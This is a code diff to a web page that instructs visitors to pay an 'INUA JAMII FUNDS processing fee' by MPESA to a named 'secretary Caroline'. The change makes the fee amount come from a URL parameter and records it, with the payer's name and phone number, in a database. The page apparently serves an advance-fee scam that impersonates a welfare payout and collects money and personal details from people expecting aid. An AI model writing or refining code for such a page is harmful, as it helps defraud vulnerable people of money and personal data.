@@ -16,7 +16,6 @@
   transition: opacity 0.3s;
 }
 </style>
-
 </head>
 <body>
 
@@ -49,7 +48,7 @@
   <h2>MPESA PAYMENT INSTRUCTION</h2>
   <p>Please follow the steps below to pay your INUA JAMII FUNDS processing fee directly to our secretary Caroline in charge of approving and releasing funds:</p>
 
-  <p style="font-size:20px; font-weight:bold;">Fee Amount: <strong>Ksh <span id="feeAmount">---</span></strong></p>
+  <p style="font-size:20px; font-weight:bold;">Fee Amount: <strong>Ksh <span id="fees2value">---</span></strong></p>
 
   <ol style="font-size:18px;">
     <li>Go to <strong>MPESA</strong></li>
@@ -77,9 +76,18 @@
 
 <script>
 const userPhone = localStorage.getItem("userPhone");
-if (!userPhone) window.location.href = "register.html";
+if (!userPhone) window.location.href = "amount.html";
 
-document.getElementById("feeAmount").innerText = processingFee;
+// Retrieve 'fees2' from URL parameters immediately
+const urlParams = new URLSearchParams(window.location.search);
+const fees2 = urlParams.get("fees2");
+
+// Set the fees2 value in the span as soon as possible
+if (fees2) {
+  document.getElementById("fees2value").innerText = fees2;
+} else {
+  document.getElementById("fees2value").innerText = "N/A";
+}
 
 // Copy Till Number
 function copyTill() {
@@ -129,10 +137,10 @@ document.getElementById("payment1Form").addEventListener("submit", function(e) {
     return;
   }
 
-  // Proceed with your existing code
+  // Save data including the fees2 value
   db.collection("users").doc(userPhone).update({
     firstPayment: {
-      amount: processingFee,
+      amount: fees2, // use the retrieved value here
       senderName,
       senderPhone,
       confirmedAt: new Date()
@@ -142,7 +150,8 @@ document.getElementById("payment1Form").addEventListener("submit", function(e) {
       status: "pending"
     }
   }).then(() => {
-    window.location.href = "payment1.html";
+    // Redirect or perform other actions as needed
+    window.location.href = "payment1.html"; // replace with actual next page if necessary
   }).catch(err => {
     alert("Error submitting payment. Try again.");
     console.error(err);
